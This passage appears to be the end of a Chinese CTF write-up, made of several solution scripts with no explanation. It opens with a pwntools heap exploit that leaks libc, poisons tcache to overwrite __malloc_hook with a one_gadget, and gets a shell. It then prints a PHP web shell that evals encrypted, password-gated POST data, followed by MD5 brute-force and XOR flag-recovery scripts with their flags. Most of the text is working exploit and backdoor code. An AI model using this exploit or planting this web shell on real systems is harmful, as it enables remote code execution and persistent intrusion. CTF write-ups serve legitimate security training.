    p.sendlineafter(b": ",str(idx))

add_heap(0x440,b"A")    #chunk 0
add_heap(0x440,b"A")    #chunk 1

free_heap(0)
show_heap(0)

libc.address = u64(p.recvuntil(b"x7f")[-6:].ljust(8,b"x00")) - 0x1ebbe0
log.success("libc =" + hex(libc.address))

malloc_hook = libc.sym["__malloc_hook"]

add_heap(0x10,b"A")  #chunk 2
add_heap(0x10,b'A')  #chunk 3

free_heap(2)
free_heap(3)

edit_heap(3,p64(malloc_hook))

one_gadgets = [0xe6c7e,0xe6c81,0xe6c84]
og = libc.address + one_gadgets[1]

add_heap(0x10,b"A")
add_heap(0x10,p64(og))

p.sendlineafter(b"adventurer? ", b"1")
p.sendlineafter(b"bytes): ", b"10")
p.interactive()
```



```
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='25ming@';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (stripos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```



```
8fa14cdd754f91cc6554c9e71929cce7
2db95e8e1a9267b7a1188556b2013b33
0cc175b9c0f1b6a831c399e269772661
b2f5ff47436671b6e533d8dc3614845d
f95b70fdc3088560732a5ac135644506
b9ece18c950afbfa6b0fdbfa4ff731d3
2510c39011c5be704182423e3a695e91
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
6f8f57715090da2632453988d9a1501b
cfcd208495d565ef66e7dff9f98764da
03c7c0ace395d80182db07ae2c30f034
e358efa489f58062f10dd7316b65649e
b14a7b8059d9c055954c92674ce60032
c81e728d9d4c2f636f067f89cc14862c
e1671797c52e15f763380b45e841ec32
4a8a08f09d37b73795649038408b5f33
4c614360da93c0a041b22e537de151eb
4b43b0aee35624cd95b910189b3dc231
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
e1671797c52e15f763380b45e841ec32
8d9c307cb7f3c4a32822a51922d1ceaa
4a8a08f09d37b73795649038408b5f33
4b43b0aee35624cd95b910189b3dc231
57cec4137b614c87cb4e24a3d003a3e0
83878c91171338902e0fe0fb97a8c47a
e358efa489f58062f10dd7316b65649e
865c0c0b4ab0e063e5caa3387c1a8741
d95679752134a2d9eb61dbd7b91c4bcc
7b8b965ad4bca0e41ab51de7b31363a1
9033e0e305f247c0c3c80d0c7848c8b3
9033e0e305f247c0c3c80d0c7848c8b3
9033e0e305f247c0c3c80d0c7848c8b3
cbb184dd8e05c9709e5dcaedaa0495cf
```



```
import hashlib
import string

flag = [
    '8fa14cdd754f91cc6554c9e71929cce7',
    '2db95e8e1a9267b7a1188556b2013b33',
    '0cc175b9c0f1b6a831c399e269772661',
    'b2f5ff47436671b6e533d8dc3614845d',
    'f95b70fdc3088560732a5ac135644506',
    'b9ece18c950afbfa6b0fdbfa4ff731d3',
    '2510c39011c5be704182423e3a695e91',
    'e1671797c52e15f763380b45e841ec32',
    'b14a7b8059d9c055954c92674ce60032',
    '6f8f57715090da2632453988d9a1501b',
    'cfcd208495d565ef66e7dff9f98764da',
    '03c7c0ace395d80182db07ae2c30f034',
    'e358efa489f58062f10dd7316b65649e',
    'b14a7b8059d9c055954c92674ce60032',
    'c81e728d9d4c2f636f067f89cc14862c',
    'e1671797c52e15f763380b45e841ec32',
    '4a8a08f09d37b73795649038408b5f33',
    '4c614360da93c0a041b22e537de151eb',
    '4b43b0aee35624cd95b910189b3dc231',
    'e1671797c52e15f763380b45e841ec32',
    'b14a7b8059d9c055954c92674ce60032',
    'e1671797c52e15f763380b45e841ec32',
    '8d9c307cb7f3c4a32822a51922d1ceaa',
    '4a8a08f09d37b73795649038408b5f33',
    '4b43b0aee35624cd95b910189b3dc231',
    '57cec4137b614c87cb4e24a3d003a3e0',
    '83878c91171338902e0fe0fb97a8c47a',
    'e358efa489f58062f10dd7316b65649e',
    '865c0c0b4ab0e063e5caa3387c1a8741',
    'd95679752134a2d9eb61dbd7b91c4bcc',
    '7b8b965ad4bca0e41ab51de7b31363a1',
    '9033e0e305f247c0c3c80d0c7848c8b3',
    '9033e0e305f247c0c3c80d0c7848c8b3',
    '9033e0e305f247c0c3c80d0c7848c8b3',
    'cbb184dd8e05c9709e5dcaedaa0495cf',
]

alphabet = string.ascii_letters + string.digits + string.punctuation
for x in range(len(flag)):
    for i in alphabet:
        en = hashlib.md5(i.encode()).hexdigest()
        if en == flag[x]:
            print(i, end="")

# flag{The_m0st_2ecUre_eNcrYption!!!}
```



```
true_flag = [
    0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 
    0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, 
    0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 
    0x05, 0x57, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 
    0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x00, 0x1B, 
    0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 
    0x4F, 0x57, 0x05, 0x54, 0x55, 0x03, 0x53, 0x57, 0x01, 0x03, 
    0x07, 0x04, 0x4A, 0x77, 0x0D
]

tmp = 'f'
for i in range(16):
    next1 = true_flag[16 + i] ^ ord(tmp[-1])
    tmp += chr(next1)

print(tmp)
for i in range(16):
    next1 = true_flag[i] ^ ord(tmp[-1])
    tmp += chr(next1)
print(tmp)
```



```
for x in range(33, len(true_flag)):
    tmp = 'flag{fcf94739-da66-467c-a77f-b50d'
    for i in range(10):
        next1 = true_flag[x + i] ^ ord(tmp[-1])
        tmp += chr(next1)
    print(tmp)

# flag{fcf94739-da66-467c-a77f-b50diosnkn1<?;
# flag{fcf94739-da66-467c-a77f-b50db~cfc<126<
# flag{fcf94739-da66-467c-a77f-b50dxe`e:740:.
# flag{fcf94739-da66-467c-a77f-b50dy|y&+(,&2{
# flag{fcf94739-da66-467c-a77f-b50dad;651;/fc
# flag{fcf94739-da66-467c-a77f-b50da>304>*cf1
# flag{fcf94739-da66-467c-a77f-b50d;651;/fc44
# flag{fcf94739-da66-467c-a77f-b50dijndp9<kkp
# flag{fcf94739-da66-467c-a77f-b50dgci}41ff}d
# flag{fcf94739-da66-467c-a77f-b50d`j~72ee~ge
# flag{fcf94739-da66-467c-a77f-b50dnz36aazca`
# flag{fcf94739-da66-467c-a77f-b50dp9<kkpikj>
# flag{fcf94739-da66-467c-a77f-b50d-(d}~*d
# flag{fcf94739-da66-467c-a77f-b50da66-467c-a
# flag{fcf94739-da66-467c-a77f-b50d33(132f(d2
# flag{fcf94739-da66-467c-a77f-b50ddfde13ee
# flag{fcf94739-da66-467c-a77f-b50dfde13ee4
# flag{fcf94739-da66-467c-a77f-b50d}~*d(~~/d
# flag{fcf94739-da66-467c-a77f-b50dfg3}1gg6}2
# flag{fcf94739-da66-467c-a77f-b50de13ee40g
# flag{fcf94739-da66-467c-a77f-b50d0~2dd5~1fc
# flag{fcf94739-da66-467c-a77f-b50d*f00a*e27c
# flag{fcf94739-da66-467c-a77f-b50d(~~/d+|y-x
# flag{fcf94739-da66-467c-a77f-b50d22c(g05a47
# flag{fcf94739-da66-467c-a77f-b50dd5~1fc7ba2
# flag{fcf94739-da66-467c-a77f-b50d5~1fc7ba2e
# flag{fcf94739-da66-467c-a77f-b50d/`72f30c45
# flag{fcf94739-da66-467c-a77f-b50d+|y-x{(~}
# flag{fcf94739-da66-467c-a77f-b50d36b74g0125
# flag{fcf94739-da66-467c-a77f-b50da5`c0gfebf
# flag{fcf94739-da66-467c-a77f-b50d0ef5bc`gc)
# flag{fcf94739-da66-467c-a77f-b50d12a67437}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1725929267.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1725929268.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1725929269.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1725929270.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1725929270.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/1-1725929271.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/8-1725929271.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1725929272.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/8-1725929272.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1725929273.png)